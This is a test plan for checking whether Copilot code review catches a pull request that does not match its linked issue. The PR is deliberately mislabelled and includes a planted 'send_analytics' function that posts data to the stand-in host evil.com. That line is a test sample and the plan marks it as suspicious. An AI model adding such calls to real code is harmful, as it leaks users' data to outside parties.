## Step-by-Step Test Plan: Can Copilot Code Review Validate Against Issue Requirements?

### Prerequisites
- GitHub account with Copilot Pro, Pro+, Business, or Enterprise subscription
- Access to a test repository (can be a new empty one)

### Test Scenario
Create a simple Issue → Mismatched PR → Review workflow to test Copilot's awareness

---

### Steps to Execute

**Step 1: 
- Initialize with a README

**Step 2: Create a simple codebase**
- Add a file `calculator.py`:
```python
def add(a, b):
    return a + b

def subtract(a, b):
    return a - b
```
- Commit directly to `main`

**Step 3: Create an Issue with clear requirements**
- Go to Issues → New Issue
- Title: "Add multiplication function"
- Body:
```markdown
## User Story
As a user, I want to multiply two numbers, so that I can perform basic arithmetic operations.

## Acceptance Criteria
- [ ] Add a `multiply(a, b)` function to calculator.py
- [ ] Function should return the product of two numbers
- [ ] Function should handle positive and negative numbers

## Technical Requirements
- Follow existing code style
- No external dependencies
```
- Note the Issue number (e.g., #1)

**Step 4: Create a branch with MISMATCHED implementation**
- Create new branch: `feature/add-multiply`
- Edit `calculator.py` to add this UNRELATED code:
```python
def add(a, b):
    return a + b

def subtract(a, b):
    return a - b

def divide(a, b):  # ← This is NOT what the issue asked for!
    if b == 0:
        raise ValueError("Cannot divide by zero")
    return a / b

def send_analytics(operation, result):  # ← Suspicious unrelated function
    import requests
    requests.post("https://evil.com/track", json={"op": operation, "result": result})
```
- Commit with message: "Add multiplication function"

**Step 5: Create Pull Request**
- Open PR from `feature/add-multiply` to `main`
- Title: "Add multiplication function"
- Description: "Fixes #1" (links to the Issue)
- Body: "Implemented the multiply function as requested in #1"

**Step 6: Request Copilot Review**
- In the PR, click "Reviewers" dropdown
- Select `@copilot` (or type `@github-copilot`)
- Wait for Copilot to post its review (usually 1-2 minutes)

**Step 7: Analyze Copilot's Response**
Check if Copilot's review identifies:
- ✅ The code doesn't contain a `multiply()` function
- ✅ The code contains `divide()` instead (unrelated to Issue)
- ✅ The suspicious `send_analytics()` function
- ✅ The implementation doesn't meet acceptance criteria
- ❌ OR does it only review code quality/style without checking requirements?

**Step 8: Create a CORRECT implementation**
- Create new branch: `feature/add-multiply-correct`
- Edit `calculator.py`:
```python
def add(a, b):
    return a + b

def subtract(a, b):
    return a - b

def multiply(a, b):  # ← Correct implementation
    return a * b
```
- Commit and create new PR
- Link to same Issue: "Fixes #1"
- Request Copilot review again

**Step 9: Compare the two reviews**
Document:
- Did Copilot catch the mismatch in the first PR?
- Did Copilot approve/validate the second PR?
- What language did Copilot use? Did it reference the Issue?

---

### Expected Outcomes

**If Copilot IS context-aware:**
- Review 1: "This PR doesn't implement the `multiply()` function requested in #1. Instead, it adds `divide()`. The `send_analytics()` function appears unrelated to the requirements."
- Review 2: "This implementation correctly adds the `multiply()` function as specified in #1 and meets the acceptance criteria."

**If Copilot is NOT context-aware:**
- Review 1: Generic comments about code style, syntax, potential bugs in `divide()`, security warning about network requests
- Review 2: Similar generic comments without validating against Issue requirements

---

### Time Estimate
- Setup: 5 minutes
- Creating test PRs: 10 minutes  
- Waiting for reviews: 5 minutes
- Analysis: 5 minutes
- **Total: ~25 minutes**

### Deliverable
Screenshot or text copy of both Copilot reviews showing whether it validated against Issue requirements or only did technical code review.
